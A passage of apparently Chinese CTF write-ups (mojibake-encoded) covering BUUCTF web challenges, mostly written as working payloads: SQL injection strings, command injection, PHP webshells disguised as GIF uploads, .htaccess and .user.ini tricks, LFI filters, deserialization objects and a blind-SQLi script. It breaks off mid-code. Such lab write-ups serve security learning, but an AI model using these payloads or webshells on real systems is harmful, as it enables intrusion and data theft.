\u0026#39;Syc{cat_cat_cat_cat}\u0026#39;; } payload\n/?cat=dog [ACTF2020 æ–°ç”Ÿèµ›]Include | LFI é¦–é¡µæç¤º/?file=flag.phpï¼Œæ–‡ä»¶åŒ…å«ç‚¹ï¼›å°è¯•/etc/passwdï¼ŒæˆåŠŸï¼Œ/flagå¤±è´¥ï¼Œå°è¯•phpä¼ªåè®®\n/?file=php://filter/convert.base64-encode/resource=flag.php [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ | sqli å †å æ³¨å…¥ 1\u0026#39; 1\u0026#39; or \u0026#39;1 1\u0026#39; union select database()# å¾—åˆ°è¿‡æ»¤æ¡ä»¶\nreturn preg_match(\u0026#34;/select|update|delete|drop|insert|where|\\./i\u0026#34;,$inject); ä½¿ç”¨å †å æ³¨å…¥\n1\u0026#39;;show tables;\t# ä¸¤ä¸ªè¡¨ 1919810931114514, words 1\u0026#39;;show columns from `1919810931114514`;\t# å«flagåˆ— ä½†åªå›æ˜¾2åˆ— 1\u0026#39;;show columns from `words`;\t# å›æ˜¾3åˆ—id+data éƒ½æ˜¯ç©ºçš„ æŠŠ1919810931114514è¡¨æ”¹åä¸ºwordsï¼Œflagæ”¹ä¸ºidï¼Œå³å¯å›æ˜¾å¯¹åº”çš„data\n1\u0026#39;;alter table words rename to amiz;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);# 1\u0026#39; or \u0026#39;1\t# å¾—åˆ°flag â€”â€”â€”â€”æˆ–è€…ä½¿ç”¨set\u0026amp;prepare from\u0026amp;executeçš„æ–¹å¼æ¥å †å \n1\u0026#39;;set @xx=concat(\u0026#39;se\u0026#39;,\u0026#39;lect * from `1919810931114514`;\u0026#39;);prepare x from @xx;execute x;# å›æ˜¾è¿‡æ»¤æ¡ä»¶\nstrstr($inject, \u0026#34;set\u0026#34;) \u0026amp;\u0026amp; strstr($inject, \u0026#34;prepare\u0026#34;) ç”¨å¤§å†™ç»•è¿‡\n1\u0026#39;;Set @xx=concat(\u0026#39;se\u0026#39;,\u0026#39;lect * from `1919810931114514`;\u0026#39;);Prepare x from @xx;execute x;# [SUCTF 2019]EasySQL | sqli å †å æ³¨å…¥ 1;show tables;\t# Flag 1;show columns from Flag;\t# è¢«è¿‡æ»¤ ç”±äºæ²¡æœ‰å®Œæ•´çš„æŠ¥é”™é¦–å…ˆçŒœä¸€ä¸‹åç«¯è¯­å¥ï¼Œè¾“å…¥é0æ•°å­—å›æ˜¾ä¸º1ï¼Œå…¶ä½™ä¸ºç©ºï¼Œæ¨æµ‹åç«¯æœ‰||è¾“å‡º0çš„æƒ…å†µ\nselect $_POST[\u0026#39;query\u0026#39;] || flag from Flag; payload\n*,1 # ç›¸å½“äº select *,1 from Flag; â€”â€”â€”â€”æˆ–è€…ä½¿ç”¨å †å ï¼Œpayload\n1;set sql_mode=PIPES_AS_CONCAT;select 1 å°†||è½¬å˜ä¸º+ä¸€æ ·çš„è¿æ¥å­—ç¬¦\nflag{4032c605-fa39-448d-aa2d-f35fca8d3fa9}\n[ACTF2020 æ–°ç”Ÿèµ›]Exec | rce payload\n127.0.0.1;cat /flag flag{f8c12653-ce6e-4eef-8f69-9433506d5adc}\n[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File | LFI é¡µé¢æºç æç¤º/Archive_room.phpï¼Œ/end.phpï¼Œ/secr3t.phpçœ‹åˆ°æ–‡ä»¶åŒ…å«ç‚¹ï¼Œç”¨ä¼ªåè®®\npayload\n/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php flag{7719d9f9-6f2f-46f7-bc78-a82cfc52d470}\n[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL | sqli è”åˆæ³¨å…¥ ä¸‡èƒ½å¯†ç ç™»å…¥ï¼Œå¾—åˆ°å¯†ç æ˜¯bd798bc32e819b4f57d4e1523d5834c6\nadmin\u0026#39; union select 1,2,3#\t# æœ‰3åˆ— 1\u0026#39; union select 1,database(),3#\t# å›æ˜¾ä½åœ¨2å’Œ3ä¸Š åº“ågeek 1\u0026#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database();#\t# è¡¨ågeekuser, l0ve1ysq1 1\u0026#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;l0ve1ysq1\u0026#39;;#\t# id, username, password 1\u0026#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1# æ³¨æ„group_concat()æ˜¯ä¸ªå‡½æ•°ï¼Œæ†‹æ‰‹æ¬ åŠ ç©ºæ ¼\nflag{e210152f-fc19-4139-9d2a-dcbb6c4c6268}\n[GXYCTF2019]Ping Ping Ping | rce ç©ºæ ¼ç»•è¿‡ 127.0.0.1;ls\t# index.php, flag.php 127.0.0.1;cat flag.php\t# fxck your space! 127.0.0.1;cat$IFSindex.php\t# ç©ºå†…å®¹ 127.0.0.1;cat$IFSflag.php\t# fxck your flag! 127.0.0.1;cat$IFS$7`ls`\t# é¡µé¢æºç å¾—åˆ°flag 127.0.0.1;a=g;cat$IFS$7fla$a.php\t# é¡µé¢æºç å¾—åˆ°flag flag{281616ef-7318-42b6-adaf-825edf76ff26}\n[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife ç™½ç»™shellï¼Œè¿èšå‰‘\nflag{95a76aa0-58b5-4494-bb49-7f11ce00774d}\n[æå®¢å¤§æŒ‘æˆ˜ 2019]Http | è¯·æ±‚å¤´ é¡µé¢æºç æç¤º/Secret.phpï¼Œè·Ÿç€æç¤ºä¸€ç›´ä¿®æ”¹è¯·æ±‚å¤´\nReferer: https://Sycsecret.buuoj.cn User-Agent: Syclover X-Forwarded-For: 127.0.0.1 flag{614f3098-1c0f-480b-97f7-9caa49025e83}\n[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload | upload è¿‡æ»¤äº†å‡ ä¸ªå¸¸è§„çš„phpåç¼€ï¼Œç”¨.php7ç»•è¿‡ï¼ŒåŒæ—¶æŠ“åŒ…ä¿®æ”¹MIMEä¸ºimage/png\nä¹‹åå‘ç°å®ƒä¼šæ£€æµ‹ä¸Šä¼ å†…å®¹æœ‰æ²¡æœ‰\u0026lt;?ï¼Œç”¨gif+phtmlæ ·å¼çš„ğŸ\npure.phtml\nGIF89a \u0026lt;script language=\u0026#39;php\u0026#39;\u0026gt;eval($_POST[\u0026#39;amiz\u0026#39;]);\u0026lt;/script\u0026gt; è¿èšå‰‘\nflag{23be575a-679e-4f7c-b75b-6e033d10bfca}\n[ACTF2020 æ–°ç”Ÿèµ›]Upload | upload å‰ç«¯é™åˆ¶åç¼€ç™½åå•jpg, png, gifï¼Œåˆ å®¡æŸ¥å…ƒç´ ä¼šåˆ ä¸æ‰å·²ç»æ³¨å†Œäº†çš„å›è°ƒå‡½æ•°ï¼Œæ‰€ä»¥ç›´æ¥æ”¹åç¼€åä¸Šä¼ ï¼Œç„¶åæŠ“åŒ…æ”¹ä¸€ä¸‹\npure.html\nGIF89a \u0026lt;script language=\u0026#39;php\u0026#39;\u0026gt;eval($_POST[\u0026#39;amiz\u0026#39;]);\u0026lt;/script\u0026gt; è¿èšå‰‘\nflag{a8ff29f2-5197-4599-a1c4-1e8b5f390a8c}\n[RoarCTF 2019]Easy Calc | php-shell é¡µé¢æºç ï¼šI\u0026rsquo;ve set up WAF to ensure security.\nnumå‚æ•°ä»¥getæ–¹å¼ä¼ å…¥ï¼Œä¸å…è®¸æœ‰å­—æ¯ï¼›ç»•è¿‡æ–¹å¼/calc.php ?num=xyxï¼ŒåŠ ç©ºæ ¼ï¼›è¿˜æœ‰chr()+asciiç \ntmp = str(input()) res = \u0026#39;\u0026#39; for _ in tmp: res += f\u0026#39;chr({str(ord(_))}).\u0026#39; print(res[:-1]) /calc.php? num=1;var_dump(scandir(chr(47)))\t# çˆ†ç›®å½•æ–‡ä»¶ f1agg /calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) flag{4f1c0f5a-5a7b-4ad4-b7f4-9eb82de3f93f}\n[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP å¤‡ä»½æ–‡ä»¶æ³„éœ²/www.zipï¼Œflag.phpä¸­å¾—åˆ°flag\nSyc{dog_dog_dog_dog}\n[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL | sqli è”åˆæ³¨å…¥ åŒå†™ç»•è¿‡ æŠŠunion, selectåŒå†™å³å¯\nadmin\u0026#39; ununionion selselectect 1,2,3# 1\u0026#39; uunionnion sselectelect 1,2,group_concat(schema_name) ffromrom infoorrmation_schema.schemata%23\t# åº“åinformation_schema,mysql,performance_schema,test,ctf,geek 1\u0026#39; ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=\u0026#39;ctf\u0026#39;%23\t# è¡¨å Flag 1\u0026#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=\u0026#39;Flag\u0026#39;\t# å­—æ®µåflag 1\u0026#39; union select 1,2,group_concat(flag) from ctf.Flag\t# ctfåº“Flagè¡¨çš„flagå­—æ®µ flag{b6848383-f7d0-4cad-ad7d-98ab54790bbe}\nå¯ä»¥å†™ä¸€ä¸ªminiè½®ï¼Œç”¨äºsqlè¯­å¥åŒå†™ï¼ˆè‡ªå·±å†™çš„æ¯”è¾ƒæ¸£å°±ä¸æ”¾äº†æ\n[ACTF2020 æ–°ç”Ÿèµ›]BackupFile | å¼±æ¯”è¾ƒ /index.php.bak\n\u0026lt;?php include_once \u0026#34;flag.php\u0026#34;; if(isset($_GET[\u0026#39;key\u0026#39;])) { $key = $_GET[\u0026#39;key\u0026#39;]; if(!is_numeric($key)) { exit(\u0026#34;Just num!\u0026#34;); } $key = intval($key); $str = \u0026#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\u0026#34;; if($key == $str) { echo $flag; } } else { echo \u0026#34;Try to find out source file!\u0026#34;; } çœ‹ä¼¼æ¯”è¾ƒå¤æ‚ä¸€ç‚¹ï¼Œä½†æ˜¯ifçš„æ¯”è¾ƒæ˜¯å¼±æ¯”è¾ƒ\npayload\n?key=123 flag{758691a1-017b-4033-899a-bd78281fbcc1}\n[æŠ¤ç½‘æ¯ 2018]easy_tornado | ssti /hint.txtï¼šmd5(cookie_secret+md5(filename))\n/flag.txtï¼š/fllllllllllllag\nç›®æ ‡æ˜¯æ‰¾åˆ°cookie_secretï¼Œåœ¨æŠ¥é”™é¡µé¢å‘ç°å¯èƒ½çš„æ¨¡æ¿æ¸²æŸ“\n/error?msg={{handler.settings}} å¾—åˆ°cookie_secret: 13b08673-9199-47bc-b5a2-bb7938591e62\n/file?filename=/fllllllllllllag\u0026amp;filehash=3725772b08f76e01024d81754c45f307 flag{5756e16a-885e-4009-83e1-653a4818a39a}\n[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag | is_numeric /pay.phpï¼Œé¡µé¢æºç \n~~~post money and password~~~ if (isset($_POST[\u0026#39;password\u0026#39;])) { $password = $_POST[\u0026#39;password\u0026#39;]; if (is_numeric($password)) { echo \u0026#34;password can\u0026#39;t be number\u0026lt;/br\u0026gt;\u0026#34;; }elseif ($password == 404) { echo \u0026#34;Password Right!\u0026lt;/br\u0026gt;\u0026#34;; } } is_numericå‡½æ•°ç”¨%20ç»•è¿‡\npassword=404%20\u0026amp;money[]=100000000 Cookie: user=1 flag{a3cd1620-d3f7-45a9-8b3d-ace1ed21e7fb}\n[HCTF 2018]admin | unicodeæ¬ºéª— flask-session â€”â€”â€”â€”éé¢„æœŸï¼šadmin: 123å¼±å£ä»¤\nâ€”â€”â€”â€”è§£æ³•1ï¼šá´¬á´°á´¹á´µá´ºunicodeæ¬ºéª—ï¼Œæ³¨å†Œá´¬á´°á´¹á´µá´º: 456çš„å·ï¼Œæ”¹å¯†ä¸º999ï¼Œç™»å…¥\nâ€”â€”â€”â€”è§£æ³•2ï¼šçœ‹cookieæ˜¯ç†Ÿæ‚‰çš„flask-sessionï¼Œæ”¹å¯†é¡µé¢/changeæç¤ºhttps://github.com/woadsl1234/hctf_flask/ï¼Œæ‹¿åˆ°secret=\u0026lsquo;ckj123\u0026rsquo;\npython3 flask_session_cookie_manager3.py encode -s \u0026#39;ckj123\u0026#39; -t \u0026#34;{\u0026#39;_fresh\u0026#39;:True,\u0026#39;_id\u0026#39;: b\u0026#39;Yjg0OGY3OWU1MTI4ZWNhNWU1YWFlZWJiYzg5ZGM1NWNkZTIxYzlkNWJmZjI0YzhkMzljYWE1YzFlZTQ4OWEzY2EwYjlmNGYzODU4OTA1MTA0M2E3MWQ3ODM0M2JmY2IxNjI4MGQxOTQwNThmZDFmODg2ODFlZTdhOTQ1ZGQ0YWM=\u0026#39;,\u0026#39;csrf_token\u0026#39;: b\u0026#39;NGEwMDMxNmEyYzhlNzhkYWRiMTUwYjBiOWIwNGFmYzI1YTIxOTQzMg==\u0026#39;,\u0026#39;image\u0026#39;: b\u0026#39;eWl6eA==\u0026#39;,\u0026#39;name\u0026#39;:\u0026#39;amiz\u0026#39;,\u0026#39;user_id\u0026#39;:\u0026#39;10\u0026#39;}\u0026#34; flag{f479cd5d-4bc7-47a6-b6b2-be84ff250880}\næ³¨æ„è¿™ä¸ªè„šæœ¬åŠ å¯†çš„æ—¶å€™çš„å†…éƒ¨éƒ½æ˜¯å•å¼•å·ï¼Œå¹¶ä¸”æ²¡æœ‰å¤šä½™çš„èŠ±æ‹¬å·\n[BJDCTF2020]Easy MD5 | sqli raw-md5æ°¸çœŸ md5ç»•è¿‡ å“åº”å¤´æœ‰Hint: select * from \u0026lsquo;admin\u0026rsquo; where password=md5($pass,true)\nphpä¸­md5çš„ç¬¬äºŒä¸ªå‚æ•°ä¸ºtrueæ—¶è¾“å‡º16å­—ç¬¦äºŒè¿›åˆ¶ï¼Œé»˜è®¤falseè¾“å‡º32å­—ç¬¦åå…­è¿›åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œè¿”å›raw md5\nmysqlä¸­åœ¨è¿›è¡Œå¸ƒå°”ç±»å‹åˆ¤æ–­æ—¶ï¼Œ1å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšintå‹\npassword=\u0026#39;xxx\u0026#39;or\u0026#39;1xxx\u0026#39; password=\u0026#39;xxx\u0026#39;or 1 password=\u0026#39;xxx\u0026#39;or\u0026#39;1\u0026#39; password=\u0026#39;xxx\u0026#39;or true\t# ä»¥ä¸Šä¸‰è€…å‡è¿”å›true password=\u0026#39;xxx\u0026#39;or\u0026#39;0trash\u0026#39;\t# false raw md5åŒ…å«å¾ˆå¤šå­—ç¬¦ï¼Œå¦‚æœraw md5åŒ…å«'trash'or'1trash'è¿™æ ·çš„ï¼Œå°±ä¼štrueï¼Œæ°¸çœŸ\nä¸€ä¸ªå‚è€ƒpayloadæ˜¯\nffifdyop hash: 276f722736c95d99e921722cf9ed621c çˆ†ç ´è„šæœ¬\n\u0026lt;?php for ($i = 0;;) { for ($c = 0; $c \u0026lt; 1000000; $c++, $i++) if (stripos(md5($i, true), \u0026#39;\\\u0026#39;or\\\u0026#39;\u0026#39;) !== false) echo \u0026#34;\\nmd5($i) = \u0026#34; . md5($i, true) . \u0026#34;\\n\u0026#34;; echo \u0026#34;.\u0026#34;; } ?\u0026gt; å‚è€ƒï¼šLeet More 2010 Oh Those Admins! writeup\nä¹‹åè¿›å…¥ä¸‹ä¸€å…³ï¼Œé¡µé¢æºç \n$a = $GET[\u0026#39;a\u0026#39;]; $b = $_GET[\u0026#39;b\u0026#39;]; if($a != $b \u0026amp;\u0026amp; md5($a) == md5($b)){ // wow, glzjin wants a girl friend. æ•°ç»„ç»•è¿‡ï¼Œpayload\n/levels91.php?a[]=1\u0026amp;b[]=2 è¿›å…¥ä¸‹ä¸€å…³\n\u0026lt;?php error_reporting(0); include \u0026#34;flag.php\u0026#34;; highlight_file(__FILE__); if($_POST[\u0026#39;param1\u0026#39;]!==$_POST[\u0026#39;param2\u0026#39;]\u0026amp;\u0026amp;md5($_POST[\u0026#39;param1\u0026#39;])===md5($_POST[\u0026#39;param2\u0026#39;])){ echo $flag; } ä¾æ—§æ•°ç»„ç»•è¿‡ï¼Œæ³¨æ„post\n/levell14.php param1[]=1\u0026amp;param2[]=2 flag{78df171e-faa3-4c31-922f-a1f532e06dac}\n[ZJCTF 2019]NiZhuanSiWei | ååºåˆ—åŒ– LFI \u0026lt;?php $text = $_GET[\u0026#34;text\u0026#34;]; $file = $_GET[\u0026#34;file\u0026#34;]; $password = $_GET[\u0026#34;password\u0026#34;]; if(isset($text)\u0026amp;\u0026amp;(file_get_contents($text,\u0026#39;r\u0026#39;)===\u0026#34;welcome to the zjctf\u0026#34;)){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;h1\u0026gt;\u0026#34;.file_get_contents($text,\u0026#39;r\u0026#39;).\u0026#34;\u0026lt;/h1\u0026gt;\u0026lt;/br\u0026gt;\u0026#34;; if(preg_match(\u0026#34;/flag/\u0026#34;,$file)){ echo \u0026#34;Not now!\u0026#34;; exit(); }else{ include($file); //useless.php $password = unserialize($password); echo $password; } } else{ highlight_file(__FILE__); } ?\u0026gt; æŒ‡å®šäº†rï¼Œç”¨data://ä¼ªåè®®\n/?text=data://text/plain,welcome to the zjctf\u0026amp;file=php://filter/convert.base64-encode/resource=useless.php \u0026lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-\u0026gt;file)){ echo file_get_contents($this-\u0026gt;file); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; return (\u0026#34;U R SO CLOSE !///COME ON PLZ\u0026#34;); } } } ?\u0026gt; éå¸¸ç®€å•çš„ååºåˆ—åŒ–\n$a = new Flag(); $a-\u0026gt;file = \u0026#39;flag.php\u0026#39;; echo serialize($a); payload\n/?text=data://text/plain,welcome to the zjctf\u0026amp;file=useless.php\u0026amp;password=O:4:\u0026#34;Flag\u0026#34;:1:{s:4:\u0026#34;file\u0026#34;;s:8:\u0026#34;flag.php\u0026#34;;} flag{0e255178-c131-4073-beb9-5821c29c0c3c}\n[SUCTF 2019]CheckIn | upload ä¼ pure.phtmlï¼Œå¯¹åç¼€æ£€æµ‹ï¼Œjpgä¼šæ£€æµ‹æ–‡ä»¶å†…å®¹ï¼Œè€ƒè™‘ä¸Šä¼ .user.ini\npure2.gif\nGIF89a \u0026lt;script language=\u0026#39;php\u0026#39;\u0026gt;eval($_POST[\u0026#39;amiz\u0026#39;]);\u0026lt;/script\u0026gt; .user.ini\nGIF89a auto_prepend_file=pure2.gif uploads/cc551ab005b2e60fbdc88de809b2c4b1\nä¼ çš„æ—¶å€™æ–‡ä»¶é‡åç»™è¿œç¨‹ç¯å¢ƒæ•´å´©äº†ï¼Œæ‡’å¾—é‡å¼€äº†ï¼Œå¯„\n[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL | sqli æŠ¥é”™æ³¨å…¥ ä¹‹å‰å‡ ä¸ªåˆ†åˆ«ç”¨äº†ä¸‡èƒ½å¯†ç ï¼Œè”åˆæŸ¥è¯¢ï¼ŒåŒå†™ï¼Œè¿™æ¬¡è½®åˆ°æŠ¥é”™æ³¨å…¥äº†\nè¿‡æ»¤äº†=ï¼Œæ¢æˆ(a)like(b)è¿™æ ·çš„\n1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),1))%23\t# H4rDsq1 1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(\u0026#39;H4rDsq1\u0026#39;))),1))%23\t# id,username,password 1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))),1))%23 1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1))),1))%23 flag{64053c33-96f3-4bea-8e94-02fb81e48236}\n[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢ | upload ä¼ .htaccess\n\u0026lt;FilesMatch \u0026#34;wuhu\u0026#34;\u0026gt; SetHandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; /var/www/html/upload/fa75c48848aa00244f9317333bbbffe1/.htaccess\nä¼ wuhu.jpg\n\u0026lt;?php eval($_POST[\u0026#39;wuhu\u0026#39;]);?\u0026gt; /var/www/html/upload/fa75c48848aa00244f9317333bbbffe1/wuhu.jpg\nè¿èšå‰‘ï¼Œæ‹¿flag\nflag{0188a589-fefe-4939-95d1-cbcc433fc9b2}\n[MRCTF2020]Ez_bypass | is_numeric æ’ç‰ˆé—®é¢˜ï¼Œçœ‹é¡µé¢æºç \nI put something in F12 for you include \u0026#39;flag.php\u0026#39;; $flag=\u0026#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}\u0026#39;; if(isset($_GET[\u0026#39;gg\u0026#39;])\u0026amp;\u0026amp;isset($_GET[\u0026#39;id\u0026#39;])) { $id=$_GET[\u0026#39;id\u0026#39;]; $gg=$_GET[\u0026#39;gg\u0026#39;]; if (md5($id) === md5($gg) \u0026amp;\u0026amp; $id !== $gg) { echo \u0026#39;You got the first step\u0026#39;; if(isset($_POST[\u0026#39;passwd\u0026#39;])) { $passwd=$_POST[\u0026#39;passwd\u0026#39;]; if (!is_numeric($passwd)) { if($passwd==1234567) { echo \u0026#39;Good Job!\u0026#39;; highlight_file(\u0026#39;flag.php\u0026#39;); die(\u0026#39;By Retr_0\u0026#39;); } else { echo \u0026#34;can you think twice??\u0026#34;; } } else{ echo \u0026#39;You can not get it !\u0026#39;; } } else{ die(\u0026#39;only one way to get the flag\u0026#39;); } } else { echo \u0026#34;You are not a real hacker!\u0026#34;; } } else{ die(\u0026#39;Please input first\u0026#39;); } }Please input first md5æ•°ç»„ç»•è¿‡ï¼Œis_numericç»•è¿‡\n/?id[]=1\u0026amp;gg[]=2 POST: passwd=1234567%20 flag{2d5c5d49-f8a2-471e-b3f0-8861a85e34a8}\n[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz | ååºåˆ—åŒ– private-func \u0026lt;?php include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = \u0026#34;1\u0026#34;; $filename = \u0026#34;/tmp/tmpfile\u0026#34;; $content = \u0026#34;Hello World!\u0026#34;; $this-\u0026gt;process(); } public function process() { if($this-\u0026gt;op == \u0026#34;1\u0026#34;) { $this-\u0026gt;write(); // æ–‡ä»¶å†™ } else if($this-\u0026gt;op == \u0026#34;2\u0026#34;) { $res = $this-\u0026gt;read(); // æ–‡ä»¶è¯» è¯»flag $this-\u0026gt;output($res); } else { $this-\u0026gt;output(\u0026#34;Bad Hacker!\u0026#34;); } } private function write() { if(isset($this-\u0026gt;filename) \u0026amp;\u0026amp; isset($this-\u0026gt;content)) { if(strlen((string)$this-\u0026gt;content) \u0026gt; 100) { $this-\u0026gt;output(\u0026#34;Too long!\u0026#34;); die(); } $res = file_put_contents($this-\u0026gt;filename, $this-\u0026gt;content); if($res) $this-\u0026gt;output(\u0026#34;Successful!\u0026#34;); else $this-\u0026gt;output(\u0026#34;Failed!\u0026#34;); } else { $this-\u0026gt;output(\u0026#34;Failed!\u0026#34;); } } private function read() { $res = \u0026#34;\u0026#34;; if(isset($this-\u0026gt;filename)) { $res = file_get_contents($this-\u0026gt;filename); // æ–‡ä»¶è¯» } return $res; } private function output($s) { echo \u0026#34;[Result]: \u0026lt;br\u0026gt;\u0026#34;; echo $s; } function __destruct() { if($this-\u0026gt;op === \u0026#34;2\u0026#34;) // å¼ºæ¯”è¾ƒ $op=2 intç±»å‹ç»•è¿‡ $this-\u0026gt;op = \u0026#34;1\u0026#34;; $this-\u0026gt;content = \u0026#34;\u0026#34;; $this-\u0026gt;process(); } } function is_valid($s) { for($i = 0; $i \u0026lt; strlen($s); $i++) if(!(ord($s[$i]) \u0026gt;= 32 \u0026amp;\u0026amp; ord($s[$i]) \u0026lt;= 125)) // åªå…è®¸å¤§å°å†™+æ•°å­—+æ™®é€šå­—ç¬¦ å³å¯è§å­—ç¬¦ return false; return true; } if(isset($_GET{\u0026#39;str\u0026#39;})) { $str = (string)$_GET[\u0026#39;str\u0026#39;]; if(is_valid($str)) { $obj = unserialize($str); // å…ˆè¿‡æ»¤å†ååºåˆ—åŒ– } } å‘ç‚¹åœ¨äºprivate functionåºåˆ—åŒ–ä¹‹åä¼šäº§ç”Ÿä¸å¯è§å­—ç¬¦ï¼Œä¸¤ç§ç»•è¿‡æ–¹å¼ï¼šphp7.1+ç‰ˆæœ¬å¯¹å±æ€§ä¸æ•æ„Ÿï¼Œæœ¬åœ°æ„é€ payloadæ—¶å…¨æ”¹ä¸ºpublicï¼›æˆ–è€…å°†%00*%00æ”¹ä¸ºåå…­è¿›åˆ¶çš„\\00*\\00ï¼ŒåŒæ—¶å°†åºåˆ—åŒ–ç»“æœä¸­çš„sæ”¹ä¸ºS\nè¿™é‡Œç”¨ç¬¬ä¸€ç§ï¼Œprivateå…¨æ”¹public\n$obj = new FileHandler(); $obj-\u0026gt;op = 2; $obj-\u0026gt;filename = \u0026#39;php://filter/convert.base64-encode/resource=flag.php\u0026#39;; echo serialize($obj); payload\n/?str=O:11:\u0026#34;FileHandler\u0026#34;:3:{s:2:\u0026#34;op\u0026#34;;i:2;s:8:\u0026#34;filename\u0026#34;;s:52:\u0026#34;php://filter/convert.base64-encode/resource=flag.php\u0026#34;;s:7:\u0026#34;content\u0026#34;;N;} flag{0138599e-6ac8-4573-b448-e15635135f63}\n[GXYCTF2019]BabySQli | sqli è”åˆæŸ¥è¯¢åˆ›å»ºä¸´æ—¶æ•°æ® é¡µé¢æºç æç¤ºï¼šselect * from user where username = \u0026lsquo;$name\u0026rsquo;ï¼›è¿™è¯´äº†è·Ÿæ²¡è¯´ä¸€æ ·ï¼Œæ²¡å‘Šè¯‰wafæ˜¯å•¥\nå¤§å†™ç»•è¿‡\n1\u0026#39;Order by 3%23\t# æœ‰3åˆ— 1\u0026#39;union select 1,2,3%23\t# wrong user! 1\u0026#39;union select 1,\u0026#39;admin\u0026#39;,3%23\t# wrong pass! è¯´æ˜ç”¨æˆ·ååœ¨ç¬¬äºŒåˆ— æˆ‘ä»¬é‡‡ç”¨çš„æ–¹å¼æ˜¯è”åˆæŸ¥è¯¢ åˆ›å»ºä¸€è¡Œä¸´æ—¶çš„æ–°æ•°æ®ï¼Œä»¥è¿™ä¸ªä¸´æ—¶æ•°æ®ç™»å…¥\nname=1\u0026#39;union select 1,\u0026#39;admin\u0026#39;,\u0026#39;202cb962ac59075b964b07152d234b70\u0026#39;#\u0026amp;pw=123 flag{a544cd1d-4676-41d2-8110-837020cf11e5}\n[GYCTF2020]Blacklist | sqli å †å æ³¨å…¥ handler è·Ÿqwbçš„éšä¾¿æ³¨éå¸¸åƒï¼Œæ‹¿payloadæ¥è¯•è¯•\n1\u0026#39;;show tables; 1\u0026#39;;show columns from `FlagHere`; 1\u0026#39;;show columns from `words`; 1\u0026#39;;Set @xx=concat(\u0026#39;se\u0026#39;,\u0026#39;lect * from `FlagHere`;\u0026#39;);Prepare x from @xx;execute x; å›æ˜¾è¿‡æ»¤æ¡ä»¶\nreturn preg_match(\u0026#34;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\u0026#34;,$inject); ç”¨handler onä»£æ›¿select\n1\u0026#39;; handler FlagHere open as amiz; handler amiz read first; handler amiz close;# handler...openæ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶åç»­å¯ä»¥ä½¿ç”¨handler...readè®¿é—®ï¼Œå¹¶ä¸”åœ¨è¯¥ä¼šè¯handler...closeæˆ–ç»ˆæ­¢å‰ä¸ä¼šå…³é—­\nflag{9ba3c903-1a8c-4a40-b32a-f9752251269c}\n[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World | sqli è”åˆæŸ¥è¯¢ ç›²æ³¨ é•¿å¾—è·Ÿå‰é¢çš„éšä¾¿æ³¨å’ŒBlacklistå¾ˆåƒï¼Œç›´æ¥ç»™å‡ºäº†flagåœ¨flagè¡¨flagåˆ—\næ‹¿fuzzå­—å…¸è¿‡ä¸€éï¼Œè¿‡æ»¤äº†and or union order group informationï¼Œç›²æ³¨pyè„šæœ¬èµ°èµ·ï¼Œä¸ŠäºŒåˆ†\nimport requests url = \u0026#39;http://e59ccad4-7152-44b6-ab8f-c632bb29ac31.node4.buuoj.cn:81/index.php\u0026#39; target = \u0026#39;glzjin\u0026#39; content = \u0026#39;\u0026#39; for i in range(1, 40): left = 32 right = 127 mid = (left + right) // 2 while right \u0026gt; left: payload = f\u0026#34;if(ascii(substr((select(flag)from(flag)),{i},1))\u0026gt;{mid},1,2)\u0026#34; data = {\u0026#34;id\u0026#34;:payload} response = requests.post(url, data) if target in response.text: left = mid + 1 else: right = mid mid = (left + right) // 2 content += chr(int(mid)) print(content) flag{1b79970-4e0-e-b78f-2d63d8c77375}\n[ç½‘é¼æ¯ 2018]Fakebook | ååºåˆ—åŒ– sqli load_file /robots.txtæç¤º/user.php.bak\n\u0026lt;?php class UserInfo { public $name = \u0026#34;\u0026#34;; public $age = 0; public $blog = \u0026#34;\u0026#34;; public function __construct($name, $age, $blog) { $this-\u0026gt;name = $name; $this-\u0026gt;age = (int)$age; $this-\u0026gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-\u0026gt;get($this-\u0026gt;blog); } public function 